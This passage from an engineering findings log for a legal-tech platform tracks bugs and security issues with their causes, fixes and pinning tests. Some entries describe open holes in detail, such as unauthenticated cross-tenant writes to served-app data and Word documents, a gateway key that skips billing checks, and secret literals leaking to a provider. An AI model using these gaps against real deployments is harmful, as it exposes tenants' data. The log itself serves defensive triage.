  JSON-escaped forms, longest-value-first, case-folded above 8 chars. Both copies are now thin
  callers. Sub-3-char values are still not substituted — doing so would destroy the surrounding
  stream — but they are surfaced on `registry.unmaskable` instead of being dropped in silence.
  Pinned by `api/tests/security/redaction.test.ts` (24 cases, one per regression).
- **`citius-listener-blocked`** (**BLOCKER 1 FIXED 2026-08-31; what remains is OPEN, MEDIUM**,
  correctness — 2A-S4 review). `citius` is the one
  SHIPPED user-defined listener source that is not deferred for a missing transport, and it still
  cannot poll. 2A-S4 fixed the part that belonged to the listener rail (the composition root now
  injects the automation seam into the executor the supervisor uses, guarded by a static test, and
  the poll unwraps the automation run envelope so the package's `listenerConfig` paths resolve
  against the action's own output). TWO blockers remain, neither of them the rail's and neither
  silent — the listener fails loudly on every tick with the exact reason on its failure counter:
  (1) `automationBinding.automationId` is the template placeholder `citius-<template>-template`,
  which no lookup resolves; ekoa-dev rewrote that id to the per-owner provisioned id inside the
  USER SANDBOX COPY of the package (integration-storage.ts), and ekoa-code deliberately descoped
  per-user sandbox packages, so the shipped binding never matches the org's provisioned automation
  (`managedAutomationId(orgId, key, templateKey)` — SINCE C1 (run 20260801-171149) this is 3-arg
  and returns `sha256(JSON.stringify([orgId, key, templateKey]))`; the 2-arg `citius-<template>`
  form recorded here no longer exists, and any remediation must resolve the id per-org or follow
  the `source.{integrationKey,templateKey}` provenance instead of hardcoding a literal). The failure surfaces as
  `unknown_automation: citius-notificacoes-template`. This equally breaks the automation
  `integration` step, i.e. it is NOT specific to the listener rail; two committed assertions
  currently pin the placeholder value (`api/tests/contract/integration-definitions.test.ts`,
  `api/tests/e2e/citius-integration.e2e.mjs`), so the fix (resolve the bound id via the
  deterministic managed id, or re-point the shipped package and both assertions) is a deliberate
  separate change. (2) The CITIUS captured browser session does not exist yet — `session-capture.ts`
  is track 2A slice 6 — so even a resolvable automation cannot authenticate to the Portal dos
  Mandatários. Close with 2A-S6 plus the id fix.

  **BLOCKER 1 IS FIXED (2026-08-31), and NOT by re-pointing the package.** The remediation this
  entry anticipated ("resolve the id per-org or follow the `source.{integrationKey,templateKey}`
  provenance") is what landed: `resolveBoundAutomation` (`automation/integration-automations.ts`)
  joins a template-bearing binding to the org's own provisioned row by its provenance stamp, falling
  back to the literal so every binding that resolved before still does, and answering an
  unprovisioned template with the DETERMINISTIC id rather than the placeholder (a placeholder in an
  error message sends a human to look for a row that is not the row). `automation/service.ts` uses it
  on the run leg AND in `clearRefusedRecipe`'s ownership gate - the gate mattered: with the literal
  fetching nothing it read EVERY caller as the orphan case, reopening the hole K6 closed. Both
  committed assertions that pin the placeholder value stay true, because the package is unchanged.
  Suites: `api/tests/automation/bound-automation-resolution.test.ts` (5 cases incl. the pre-C1 legacy
  row and the no-template builder case). VERIFIED LIVE 2026-08-31 against the committed fixture
  (`evidence/citius/proof-01-resolution.txt`): `provision-automations` created 6 rows and
  `consultar_notificacoes` now starts a real run under the managed id
  `f6c8f41b7f41…` instead of answering `unknown_automation: citius-notificacoes-template`.

  **WHAT IS STILL OPEN is blocker 2, and it is narrower than written above.** The captured browser
  session DOES exist now (the Cofre + attended ceremony landed), and this package is wired to it: its
  `sessionConnect` resolves per tenant and the ceremony banks a session bound to that origin. What
  has NOT been done is running it: no Citius action has ever completed against a portal, real or
  fixture, because that needs a paired machine and a human at it. The live proof above stops exactly
  there, with the honest refusal `no machine is paired to your account`. CLOSE BY driving the fixture
  end to end from a paired bridge (learn -> replay -> self-heal), then once against the real portal.
- **`event-array-field-shape-drift`** (OPEN, LOW, correctness — 2A-S4 review note). Both poll
  sources treat a non-array `eventArrayField` as an empty batch (`asArray` returns `[]`), so a
  provider that changes the shape of that field advances the cursor over items that were never
  read. Identical in `platform-poll.ts` (approved at 2A-S1) and in ekoa-dev, so it is recorded here
  rather than changed inside a slice: the honest fix is to distinguish "absent/array" (a real empty
  batch) from "present but not an array" (a shape change ⇒ stall the cursor and report it).

- **`insolvencia-watch-at-least-once`** (OPEN, LOW, quality — run 20260717-190134 E4). The Citius
  insolvência polling watcher persists a seen-ref after each durable watch.hit emit, but the
  emit-then-persist is at-least-once not atomic: if `updateWatch` itself fails after the event
  write, that one publication can re-emit a duplicate dossiê timeline entry on the next poll (never
  data loss, never cross-org). The seenRefs cap (500 newest) likewise assumes the portal's active
  window stays under the cap. Both are documented v1 limits (fixture-driven; the real-portal use is
  the attended signed-in-connector follow-up run per BRIEF §8 run-2 note); a windowed cursor +
  idempotent event write is the follow-up hardening.

- **`builder-raw-view-wider-than-the-save-path`** (FIXED 2026-08-03, HIGH, credential disclosure
  (intra-tenant) — found by the D2 fresh-context re-review probing 37 scenarios over real HTTP, not
  by a test failing). D2's round-trip fix (`editablePackageFor`,
  `api/src/routes/integration-builder.ts`) gated the RAW, byte-exact package on
  `doc.orgId === actor.orgId` — strictly WIDER than the set `PUT /package` accepts, and the same
  too-wide predicate sat in `resolveSkillMdRaw` (`api/src/integrations/definition-registry.ts`). Two
  principals with NO write reach were handed a plaintext `Authorization` header (and the raw
  SKILL.md) that answered `[REDACTED]` before D2: a plain `user` peer over a peer's `org`-shared row
  (PUT 403 `key_taken`), and ANY reader of an OWN-ORG `global` row including its author (PUT 403
  `published_row`). Intra-tenant, so not the cross-org class — but a credential read with no edit to
  protect is a pure exposure, and the A3 re-review had already named this shape (`getForActor`
  legitimately answers a same-org peer's `org` row); A3's fix closed only the CROSS-ORG half of it.
  FIXED: one exported predicate, `canEditDefinitionRaw` (definition-registry.ts) =
  `visibility !== 'global' && sameOrg && canWriteDefinition`, i.e. literally
  `saveAuthoredDefinition`'s admission set, used by BOTH raw projections so the config half and the
  skillMd half of one editable package cannot drift again. Pinned by
  `api/tests/contract/integration-builder.test.ts` ("GET /package raw projection == the PUT
  admission set": the two negatives each asserted alongside their 403 AND the stored bytes being
  unchanged, plus the org-admin POSITIVE so the gate is the save set and not merely "narrower") and
  `api/tests/integrations/definition-registry.test.ts` ("resolveSkillMdRaw is gated on the SAVE
  path"). Revert-verified: 3 registry cases + 2 contract cases go red on the old predicate.

- **`raw-view-predicate-was-a-follow-up-nobody-could-find`** (FIXED 2026-08-03, LOW, process —
  found by the D2 fresh-context re-review). D2's decision entry claimed the duplication of the raw
  view's own-org rule across the route and the registry was "recorded as a follow-up", but there was
  no `docs/findings.md` row, no gate-status marker and no sentence in `docs/decisions.md` saying so.
  A follow-up nobody can find is not recorded — and in this case the un-recorded duplication was the
  exact thing that let the HIGH above exist in two places at once. FIXED by removing the
  duplication rather than tracking it (`canEditDefinitionRaw`, one implementation, two call sites)
  and by this row. LESSON: "recorded as a follow-up" is a claim about an artifact; if the artifact
  is not named, the claim is false.

- **`orgless-actor-can-be-same-org-as-an-orgless-row`** (FIXED-WHERE-REACHABLE 2026-08-03, LOW,
  tenancy predicate — found by the D2 fresh-context re-review, probe S4). Three sites compared org
  ids with a bare `===` while only one had the guard. `isDefinitionVisibleTo`
  (`api/src/integrations/definition-store.ts:202-205`) hardened exactly this ("an org-less actor
  must not become 'same org' as an org-less document") but its `visibility === 'global'` branch
  returns BEFORE that guard, so an org-less actor reading an org-less `global` row reached the
  downstream same-org derivations with `'' === ''` and got the foreign row's plaintext
  `Authorization` back. FIXED at both derivations this change owns: `sameOrg()` in
  definition-registry.ts now guards `canEditDefinitionRaw` (hence both raw projections) and
  `definitionFromDoc`'s `id`/`visibility` projection. Pinned by the registry case "an ORG-LESS actor
  never becomes 'same org' as an ORG-LESS row", which inserts a `orgId: ''` row UNDER the store
  (`create` refuses to mint one) and asserts the row still RESOLVES (global is cross-org, by design)
  while yielding no storage envelope and no byte-exact body.
  RESIDUE, deliberate and stated: the ordering inside `isDefinitionVisibleTo` is NOT changed — that
  file was outside this change's ownership, and on inspection the ordering is also correct on its
  own terms (a `global` row IS visible cross-org, so the guard does not belong on that branch). The
  invariant that matters is that no DOWNSTREAM "this row is mine" derivation may be reached with two
  empty strings; that is now one guarded helper. Reachability stays low either way (registration
  always mints an org, and `IntegrationDefinitionStore.create` rejects `orgId === ''`), so the
  remaining exposure is a malformed/legacy row inserted around the store. CLOSE FULLY BY: auditing
  the other `orgId ===` comparisons outside integrations/ against the same helper.

- **`chokepoint-gate-never-scanned-the-test-suite`** (FIXED 2026-08-03, MEDIUM, gate coverage —
  found by the D2 fresh-context re-review; pre-existing, not D2's). `scripts/chokepoint-grep.sh`
  scanned `api/test` — a fixture directory holding only `fake-daemon` — while its own comment
  claimed it covered "the test harness". `api/tests` (the actual suite) was never scanned, so ~9
  provider references across 7 spec files were invisible to the gate and a genuine raw
  `api.anthropic.com` in a spec would have been too. FIXED: both paths are scanned. The pre-existing
  hits were TRIAGED, not grandfathered — every one turned out to ENFORCE the rule rather than break
  it, and each is exempted at the narrowest granularity that fits it: `api/tests/llm/` by PATH (the
  chokepoint module's own suite, mirroring the `api/src/llm/` exemption one-for-one — it must be
  able to name the SDK it mocks), and five individual LINES by the `chokepoint-gate-allow` marker
  (four anti-leak assertions that the token is ABSENT, plus the `boot-b.mjs` journey harness's
  opt-in `EKOA_LLM_DIRECT` posture, which sets `LLM_CHOKEPOINT_BASE_URL` — the CHOKEPOINT's own
  destination, the sanctioned external-chokepoint topology `llm/credentials.ts` implements — never a
  route around it). No real violation was found. Pinned by
  `api/tests/security/grep-gates.test.ts` ("chokepoint grep gate: scope + exemption mechanism"),
  which runs the REAL script against a planted violation under `api/tests` and asserts it goes red,
  that the marker exempts only its OWN line, and that the tree is currently clean. Revert-verified:
  restoring the `api/test`-only path turns two of those red.

### Part B live proof + walkthrough (run 20260717-190134-9d4c1cbf)

- **`answer-channel-preamble-leak`** (OPEN, MEDIUM, quality). A live chat turn's sheet revision 1
  contained model-internal English preamble ("This is taking too much effort... grep approach...")
  as part of the ANSWER text (no tool boundary separated it, so the transport classification is
  correct - the model narrated inside its answer turn). PT-facing product shows English internals.
  Candidate fixes: answer-shaping instruction in the chat agent context, or a narration-shaped
  head heuristic feeding the thinking channel. Found by the B7 walkthrough vision pass.
- **`knowledge-tool-sync-io-stall`** (OPEN, MEDIUM, perf). Knowledge tool calls block the api
  event loop for multi-second stretches (observed ~3s+ per call during B7 debugging; it stalled
  SSE keep-alives long enough to 502 the old dev proxy). Async/offload candidate.
  **Addendum (C7 voice proof, run 20260717-190134-9d4c1cbf):** the blast radius is wider than
  the SSE-keepalive framing above - the SAME stall was observed delaying an entirely UNRELATED
  live WebSocket connection's server-side message processing (the voice relay's stub STT
  responding to a marker frame) by 9-18s while a concurrent chat run's agent work (tool calls)
  was in flight on the SAME api process. Confirms this is a genuine event-loop-wide stall, not
  scoped to the requesting HTTP/SSE connection - worth weighting into the fix's priority.
- **`context-block-hold-back-leak`** (FIXED 2026-07-18, run 20260717-190134-9d4c1cbf closing security review). Found by the
  C7 voice proof (run 20260717-190134-9d4c1cbf) while driving a real TALKING-mode turn end to
  end: the model's internal `<ekoa-context>{...}</ekoa-context>` state-tracking block (ch05
  §5.7.2, `api/src/agents/markers.ts` `CONTEXT_OPEN`/`CONTEXT_CLOSE`) partially LEAKED onto the
  live `text_chunk` wire and was consequently spoken aloud via the voice pipeline's TTS `say`
  (observed verbatim: `<ekoa-context>\n{"userGoal": "...", "knownContext": [], ...`). The
  persisted (final, authoritative) assistant message was clean - `MarkerProcessor.end()`'s full
  final pass correctly stripped the block from the PERSISTED text - so this WAS a LIVE-STREAM-ONLY
  leak, not a persistence-layer defect. Root cause (read, not yet fixed):
  `MarkerProcessor.drain()`'s split-marker hold-back (`HOLD_BACK = MAX_MARKER_LEN - 1`, ~14 chars)
  protects a MARKER LITERAL (e.g. `<ekoa-context>` itself) from splitting across a chunk
  boundary, but does NOT protect an OPEN-but-not-yet-CLOSED context block's UNBOUNDED body: once
  `<ekoa-context>` has opened and its close tag has not yet arrived, `stripSignals()`'s context
  loop can only wait (`if (close === -1) break`), while `drain()`'s hold-back releases everything
  except the last ~14 characters of the buffer regardless - so as soon as the open tag + body
  grows past the hold-back window (very plausible: the body is a small JSON object, easily
  >14 chars, and can arrive over several deltas while the model keeps generating), the excess
  streams to the wire as if it were safe prose. This affects the ORDINARY (non-voice) chat
  transcript too - text_chunk is the same wire regardless of modality - but no existing test
  scans transcript content for the literal `<ekoa-context>` substring (existing marker tests use
  a short FIXED marker split across exactly two chunks, not an unbounded, late-closing block), so
  it went unnoticed until the voice pipeline made the leak audible. Likely fix direction: track
  "inside an open, unclosed context block" as buffer state and hold back from the open tag
  forward (not just the trailing HOLD_BACK window) until the close tag resolves it. Out of C7's
  scope (agents/markers.ts is shared chat-pipeline infrastructure, not voice-specific); a
  dedicated fix + regression test (a context block whose body exceeds HOLD_BACK, split across
  many small deltas) is owed.
  FIX: `api/src/agents/markers.ts` `drain()` now holds back from an unclosed `<ekoa-context>` open tag (not just the fixed ~marker-length tail) until its close arrives, so the block's body never streams to the live `text_chunk` wire; stripSignals then removes the complete block. Regression-pinned in `api/tests/agents/markers.test.ts` (a split open-block delta whose body must not appear in the live emission). Verified: markers + transport + chat suites 43/43.
- **`chip-title-raw-first-line`** (OPEN, LOW, polish). The composer chip renders the sheet's raw
  first line when no model title exists yet; once reply_summary lands the sheet has a title the
  chip could prefer.

### Cortex gateway (run 20260717-071930-d1244839)

- **`gateway-anon-tooluse-fidelity`** (OPEN, HIGH - found by S6 live proof; a top follow-up item;
  CONFIDENTIALITY dimension added by the run-level security review 2026-07-17). The EXACT deny-listed
  literal never leaks - egress tokenization deep-walks tool_result/tool_use string leaves and is
  fail-closed, so a deny-listed literal in an `ls` output is tokenized before it crosses the wire.
  BUT the run's own live evidence shows the literal comes back to the client MANGLED across turns
  (`ZarkovH90305` -> `ZarkovH9305`, a dropped digit); the deny-list is matched LITERALLY, so the
  corrupted variant is NOT re-tokenized when the CLI feeds it back as a tool_result (e.g. a
  "no such file: ZarkovH9305" error) - a near-miss of the secret literal can then egress to the
  PROVIDER in cleartext (partial, not full, disclosure - to the very party §17.4(b) withholds it
  from; NOT a cross-tenant leak). The re-egress step is inferred from the code path, not yet
  reproduced live - a targeted repro is owed before sizing. Deny-list orgs only; empty-ruleset is a
  proven no-op. The deeper anonymisation-plane fix direction is unchanged; this note re-classes it
  so it is not deprioritised as merely cosmetic.
  With a NON-empty deny-list, a stock Claude Code session cannot reliably navigate a filesystem
  whose paths contain a deny-listed literal: the tokenized directory name that reaches the model in
  a `tool_result` (an `ls`/`find` output) does not reliably detokenize back in the model's next
  `tool_use` argument, so the CLI tries to open the FAKE path and reports "directory not found", or
  the literal comes back mangled across calls (observed: `ZarkovH90305` -> `ZarkovH9305`, a dropped
  digit). This survives the S7 stable-vault fix (tokens are now consistent turn-to-turn), so the
  residual is DETOKENIZATION FIDELITY of `tool_use` argument blocks under the tool_use/tool_result
  density that coding traffic exercises and bridge traffic never did - exactly the brief's §3
  anticipated risk ("coding traffic exercises tool_use/tool_result density the bridge traffic never
  did"). The EMPTY-ruleset case is a true no-op and lands byte-identical (proven live), so ONLY
  deny-list orgs doing filesystem work through Claude Code are affected. Fix is a deeper
  anonymisation-plane change (reliable whole-token detokenization of tool_use args when the model
  reformats/splits a format-preserving fake, plus overlapping deny-list x structured-ID x NER span
  resolution) - a dedicated follow-up run, NOT bolted onto the S6 proof driver. The S6 driver
  records this as an honest KNOWN LIMITATION (never green-washed).

- **`gateway-vault-per-request-instability`** (FIXED by S7, commit bdbc472/d783f7d/31309d9). On the
  gateway path a stock Anthropic client (Claude Code) sends no `metadata.session_id`, so
  `proxyGatewayMessages` opens a FRESH ephemeral vault per request (`sess_${correlationId}`). Vault
  tokens are minted per-class by sequence and are deterministic only WITHIN one vault, so across
  Claude Code's agentic tool loop (each tool step is a separate gateway request) a deny-list literal
  in a filesystem path tokenizes inconsistently and a prior turn's token fails to detokenize - the
  CLI then sees a directory that "does not exist" and the tool loop fails in confusing ways (exactly
  the brief's §3 anticipated failure). The EMPTY-ruleset round trip is a true no-op and lands
  byte-identical (proven live), so only deny-list orgs are affected. Fix (S7): derive a STABLE
  session key for a gateway principal without an explicit session_id (the gateway keyId), so one
  Claude Code session shares one vault (30-min TTL) and tokens stay stable across the loop.

### Contract / schema drift (the schema-coverage honor-system class)

- **`openapi-contentmd-bytes-vs-chars`** (medium, run 20260730 E6). `WriteNoteRequest.contentMd` is
  bounded at 1,000,000 CHARACTERS while the body parser's limit is 1 MiB of BYTES, so a body that is
  VALID against the published spec can still answer 413 - accented Portuguese exceeds one byte per
  character. The 413 is documented on all 10 body-accepting operations and its description names the
  trap, but the schema still promises a size the transport cannot carry. Real fix: narrow
  `contentMd`'s bound or raise the body limit - a behaviour change to shipped endpoints, deliberately
  out of scope for a spec-generation slice.
- **`openapi-body-limit-hand-carried`** (low, run 20260730 E6). The 1 MiB body limit is copied from
  `api/src/server.ts` into the generator's 413 description - the one place the generator does what it
  otherwise refuses (it THROWS rather than guess a media type, but copies this number). Prose only, so
  a stale value misleads a reader without breaking a client, and the drift test asserts the
  BYTE-vs-CHARACTER warning shape but NOT the number, so it can go stale silently. Fix: a `shared/`
  constant read by both.
- **`openapi-automations-path-params-untyped`** (low, run 20260730 E6). The automations routes pass
  `req.params.id`/`stepId` through with no `safeParse`, so the spec types them as bare strings.
  Declaring a `params` schema would encode a constraint the contract does not actually hold AND emit a
  400 those routes never produce, so omitting it is the accurate choice today. Fix: validate the params
  in the routes first, then declare them.
- **`openapi-drift-gate-dirty-source`** (low, run 20260730 E6, KNOWN LIMIT). The generator and its drift
  gate read `@ekoa/shared` from the gitignored `shared/dist`, and the freshness check (`tsc -b --dry`)
  proves dist is CURRENT WITH source, not that source is committed. A concurrent session's uncommitted
  edit, freshly built, therefore lands in the published contract with a green gate - reproduced twice in
  run 20260730, in both directions. Failing on a dirty tree would block the normal edit-build-test loop,
  so the control is procedural: verify a committed generated artifact from a pristine checkout. Possible
  mechanical fix: gate on `git status --porcelain -- shared/` only when a CI env var is set.
- **`automations-runs-limit-unvalidated`** (medium, run 20260730, found by the independent test pass).
  `GET /api/v1/automations/runs` ignores the `limit` constraints the OpenAPI document publishes
  (`limit=0` answers 200 with an empty list instead of 400; `-1`, `501` and `abc` are ignored; `2.5` is
  floored), because the route hand-rolls `Number(req.query.limit)` instead of parsing the shared schema.
  The sibling list operations in the same document (knowledge documents, memvault notes) enforce the
  identical schema exactly, so this is an outlier, not a convention.
- **`automations-idempotency-header-undocumented`** (low, run 20260730, found by the independent test
  pass). `POST /api/v1/automations/{id}/runs` fully implements an `Idempotency-Key` HEADER (replay, 400
  on a repeated raw header, 400 on header/body conflict, empty-as-absent) but documents only the body
  field, so a generated client cannot use the header form or know that misusing it is a 400. Fix: a
  headers field on the descriptor, then emit it.

- **`schema-coverage-honor-system`** (structural). The schema-coverage gate is a hand-maintained
  allowlist that does NOT verify a test exercises each COVERED endpoint; a green gate is not proof a
  body matches its schema. Audit 2026-07-10 found 27 of 154 COVERED keys unexercised and ~6 endpoint
  groups returning schema-violating bodies. The three items below are instances. Real fix: a run-wide
  registry of actually-exercised schemas (specified, unimplemented). Tracked: `docs/testing.md`.
- **`llm-classify-contract`** (medium). `ekoaLocal.llmClassify` handler emits no `category` and reads
  `req.body.prompt`, diverging from the contract input shape; a compliant client gets a schema-
  violating response.
- **`triggerView-active-drop`** (minor). `triggerView` drops the `active`/disabled field (optional
  field silently omitted), so trigger state is invisible to a schema-strict client.
- **`view-timestamps-drop`** (minor). `memoryView` and `artifactView` omit `createdAt`/`updatedAt`
  (optional-drop).
- **F14** (harness-gap, minor). The served-app owner bypass accepts both `Authorization: Bearer` and
  `?token=`; the committed suite asserts only `?token=`. Untested accepted-auth surface.
- **`artifact-cards-invalid-date`** (minor, UX). The expanded "Os Meus Artefactos" cards render
  "Invalid Date" in the date row for every featured artifact (observed live 2026-07-12 on a fresh
  dev stack, all 41 cards). Likely the card formats a missing/differently-shaped timestamp on
  seeded featured artifacts (`createdAt`/`updatedAt` absent or non-ISO) straight through
  `new Date(...)`. Fix: tolerate absent timestamps (hide the row) and add a regression assertion
  that no card ever renders the literal "Invalid Date".
- **`ai-integration-lands-under-platform-tab`** (minor, UX). An AI-built integration saved via the
  chat builder (e.g. open-library, e2e-proof-weather, openweathermap) renders under
  `/integrations?tab=plataforma` ("Integrações da Plataforma"), while "Minhas Integrações"
  (`?tab=minhas`) shows the empty state - so a user who just built an integration and looks under
  "Minhas Integrações" does not find it (confusing). It is available to the org (works), just filed
  under the wrong tab for its provenance. Observed live 2026-07-11. Likely the "mine" filter keys on
  a config/credential-instance concept rather than `userCreated` runtime definitions. Decide the
  intended split and route userCreated runtime defs to the "mine" tab (or relabel the tabs).
- **`integration-handoff-spurious-build`** (medium, UX). Confirming a chat integration offer (the
  two-turn `[[EKOA_INTEGRATION_BUILD]]` handshake) reliably ALSO spawns a real app-build job that
  runs the coding agent with an effectively-empty task and terminates `BUILD_UNFULFILLED` ("A
  construção não chegou à aplicação servida"). Observed live 2026-07-11 for both rest-countries and
  open-library: the integration panel opens and generates+saves correctly (proven — the integration
  lands on `/integrations` with its actions), but the chat column shows a spurious failed build
  alongside it. The build job carries a jobId (server-created) yet no `Vou ligar essa integração
  primeiro.` message precedes it, so it is NOT the build-path in-build classifier; and the client
  `isBuildSession` gate is false on a fresh chat session, so the client message router did not kick
  it — the spurious `build_intent` originates in the server marker orchestration when the
  confirmation turn is classified. Not blocking (the integration still saves) but pollutes the
  handoff. Close by tracing the turn-2 emission: the chat run must emit ONLY the integration signal
  (or, if it emits both, integration must win over build in `agents/chat.ts` — currently build is
  checked first). Add a deterministic test asserting one signal per confirmation turn.

- **`served-app-data-unauthenticated-writes`** (HIGH, pre-existing, operator decision - surfaced by
  H5's destructive-action-authz assertion). The served-app data plane `/api/app-data/:collection`
  authenticates NOTHING about the CALLER: `served-data.ts` `scopeFor()` requires only a well-formed
  `X-Ekoa-App-Id` header + the app OWNER's activation, then scopes to that app's partition. So ANY
  caller who knows an app id/slug can `POST`/`PUT`/`DELETE` that app's data ACROSS TENANTS (a private
  org app's data can be tampered/deleted by an outsider who learns its id). Two compounding facts:
  (1) the manifest collection-rule `access:{ write:'session'|'server' }` is DECLARED but NOT enforced
  by served-data.ts (the write mode is decorative); (2) the app-sso session cookie is
  `Path=/api/app-sso`, so it is not even sent to `/api/app-data` - there is no session to check at
  that path today. NOT introduced by the operator-run (C3/D-era served-app data plane); on a
  DIFFERENT axis from the platform role/capability layer H1-H4 close (which is complete). Phase 10's
  "destructive-action authorization asserted server-side" is NOT met for this surface. FIX (an
  operator architecture decision, a dedicated post-H slice): enforce the declared collection write
  mode and make an app-sso session verifiable at the data path (widen the app-sso cookie path or mint
  a session token the data plane checks); `write:'server'` collections should reject ALL client
  mutations. Pinned as a TRIPWIRE in `api/tests/security/destructive-action-authz.test.ts` (a fix
  flips the test) + behaviorally green today in `api/tests/contract/served-app.test.ts`. Tracked in
  `docs/security.md`.

  **Surface extension 2026-07-24 (2C-S4, `/api/app-docx/*`).** The same posture now also exposes the
  owner's SOURCE WORD DOCUMENT. `api/src/apps/app-docx.ts` mirrors app-files' `admitApp` (mandated
  for consistency), so it too authenticates NO caller - only a well-formed `X-Ekoa-App-Id` plus the
  resolved OWNER's activation. Consequently any caller who knows an app id/slug can: read the full
  document text via `GET /api/app-docx/projection`, download the raw bytes via `GET
  /api/app-docx/current` and `POST /api/app-docx/clean`, and **persist mutations** via `POST
  /api/app-docx/edits` (accept/reject/comment/reply/resolve). Aggravating factor specific to this
  surface: `apps/document-source.ts` `applyReview` resolves the author SERVER-SIDE from the artifact
  owner, so an anonymous outsider's tracked changes and comments are written into a legal `.docx`
  **attributed to the lawyer** (the owner's username), with no record that the caller was not them.
  Remanence: `deleteArtifact` (`api/src/apps/artifacts-service.ts`) removes only the artifact row and
  not the app's data dir - afterwards `resolveApp` returns null, `artifactBacked` is false, the
  owner-activation gate is SKIPPED entirely, and the orphaned document under
  `<EKOA_DATA_DIR>/app-data/{appId}/docx` remains readable and mutable to anyone holding the id. Same
  root cause and same operator decision as the parent entry (no separate fix timeline); a caller/
  session check on the served-app planes closes both. Current state PINNED as a tripwire in
  `api/tests/security/app-docx-authz.test.ts` so a future hardening flips it visibly.

### Gateway / egress

- **`gateway-502-masks-401`** - CLOSED (local-bridge consumer run s7, 2026-07-11, merged from the
  parallel session): typed `CredentialError` -> 503 `credential_error` (non-retryable), rate-cap ->
  429, transient stays 502; `/health claudeAuth.lastProviderError` carries class+timestamp only;
  gateway metadata is an allowlist (`user_id` only), killing the sibling mask.
- **`health-bridgeConnections-mismatch`** (small, merged from the parallel session's recon). `/health
  bridgeConnections` reports `sseManager.connectionCount` (SSE clients), not the bridge registry's
  daemon-socket count the field name promises. One-line fix in server.ts /health + a health contract
  assertion.
- **`e2e-estate-no-committed-env`** (open, structural; merged - extends `e2e-estate-baseline-13`
  below). 49 of 213 due specs red when the WHOLE ledger estate runs against the run-driver stack
  (the served-app compat `/api/v1/action` suites 404 at every commit; demo tours exceed the 30s
  timeout on dev-next latency). Needs a committed full-stack e2e harness + a compat-suite triage.
- **`gateway-apikey-checkAllowance`** (medium, security). The gateway `apikey` principal skips
  `checkAllowance` and bills the platform admin account - an exfil surface reachable from a build
  subprocess. Operator decision owed on the sanctioned posture.
- **F8** (judgment, minor). Provider/credential error surfaces are not user-grade: chat can stream an
  English spec citation, the adapter can leak raw provider JSON, and build failure is a generic PT
  sentence with no cause. Needs one error-mapping layer at the streaming sink (PT message + machine
  code, detail in logs).

### Product bugs

- **`automation-private-visibility-unenforced`** (HIGH, run 20260730, found by the independent test
  pass, FIXED same run). `visibility: 'private'` on an automation was stored, echoed by
  `toWireAutomation`, and published as `Automation.visibility` in the OpenAPI document - and enforced
  nowhere: a same-org peer read a private automation by id and saw it in the list, under a JWT or a
  gateway key. Six diff-reading review rounds missed it because the leaking code was code nobody
  changed; only an agent driving the whole running surface found it. Now one predicate
  (`isVisibleTo`) inside `canReadAutomation`/`canWriteAutomation`: private is OWNER-ONLY, not the
  org-admin and not the super-admin, following `OwnerVisibilityScoped` (the repo's existing rule for
  this exact field) rather than `canSeeRun` (a different resource's default scope). Absent or `'org'`
  keeps legacy behaviour byte for byte. Refusals are a uniform 404 - PATCH/DELETE/run-create
  previously answered 403, which was itself an existence oracle.
- **`automation-managed-metadata-leak`** (low, run 20260730, OPEN). Two paths still expose an
  automation's id and sometimes its NAME to org members regardless of visibility:
  `api/src/automation/integration-automations.ts` `sessionActionRows` (id + name for
  integration-managed automations) and `api/src/events/service.ts` `listTriggers` via `triggerView`
  (opaque id + integrationKey/eventName). Both are metadata on a DIFFERENT resource - the automation
  itself correctly 404s - and the provisioner never marks managed rows private, so this only bites
  after someone PATCHes a managed automation to private. Out of the fixing slice's file set.
- **`automation-triggered-subautomation-owner-skip`** (low, run 20260730, OPEN, pre-existing). A
  trigger-driven run's `sub_automation` step re-enters `runAutomation` with the owner check skipped,
  so a triggered parent could call a sub-automation the trigger owner does not own. Not reachable
  through the public wire (`mapWireStepToEngine` drops `subAutomationId`); only via planner output or
  an integration template.

- **`restoreVersion-featured-500`** (medium). `restoreVersion` on a *featured* artifact still 500s.
  (The broader versions-500 - never-built artifacts and the featured list - was fixed 2026-07-11; this
  case remains.)
- **`web-sourceinput-divergence`** (medium). A web/`shared` `SourceInput` divergence makes a seed-
  template knowledge source 400 from the UI.
- **`login-double-session`** (minor, dev-only). The login landing double-creates sessions (React
  StrictMode double-mount of the eager empty-session create); dev-DB orphan-row noise, and the /chat
  landing intermittently GETs a just-created session id that 404s (the e2e trackers carry a scoped
  exclusion for exactly that 404 pattern - remove it when this closes). The write should be
  idempotent/effect-guarded.
- **`chat-sse-discovery`** (deferred, batch-2). S1 adversarial-tester discovery set: chat-SSE late-
  subscriber gap, run hangs on upstream auth failure, temp-session 404 persist.
- **`web-tests-untypechecked`** (low, batch-2). Web `__tests__` are excluded from tsc, so web test
  files are never typechecked.
- **`e2e-estate-baseline-13`** (medium, per-spec debt). The first honest full-stack estate run
  (2026-07-11, 187/200 green after this run's fixes) leaves 13 red ported specs, ALL pre-existing
  product/UI gaps (none touch this run's diffs): (a) the documented band2 legacy group still built
  around the retired `/api/v1/action` + old stubs - artifact-backend-panel, artifacts-apps-section,
  update-from-bundle, vertical-profile, onboarding x3 (REST migration owed; see
  docs/e2e-harness-remediation-brief.md); (b) integrations UI gaps - pages-manage expects a search
  input the migrated page lost, integrations-sections' Webhooks tab renders no webhook rows,
  integrations-pipedream master-toggle default/persistence semantics differ; (c) legal-content
  gaps - legal-rcbe journey, legal-shared-drift (six scaffolds vs canonical layer), simuladores-
  trabalho exact CT figures. Each is closed by building the missing surface or by an explicit
  retire decision - never by editing the ported spec.

- **`branding-tab-stale-after-research`** (minor, UI freshness). Right after a brand research
  completes, the Marca tab can render the PREVIOUS palette (local component state seeded at page
  load) while `org.branding` already holds the new one - a fresh reload shows the correct values.
  Observed live 2026-07-11 during the walkthrough recording (post-research tab showed `#1A2D5A`,
  persisted+reload truth was `#1C2B4A`). Likely the local-state sync effect on
  `settings/branding/page.tsx` not re-seeding after `fetchCompany()`. Close with a deterministic
  test that researches (fake transport), switches to the Marca tab and asserts the fresh hex.

- **`collection-rule-access-unenforced`** (medium, data-plane; H5 assertion-layer surfaced). A
  collection rule's `access:{write:'session'|'server'}` is DECLARED in the app manifest schema but
  NOT enforced by served-data.ts - all app-data writes are app-id-scoped (owner-activation
  admission), so the per-collection write mode is decorative. Pre-existing C3/data-plane concern,
  OUTSIDE the H security block (which gates the PLATFORM authz; the served-data plane is a separate,
  documented app-id-scoped design). Close by enforcing the declared write mode in served-data.ts OR
  by removing the unenforced field from the manifest schema. Flagged by H5's destructive-action-authz
  assertion (the privileged app-sso ops ARE gated + asserted; this is the general data plane).

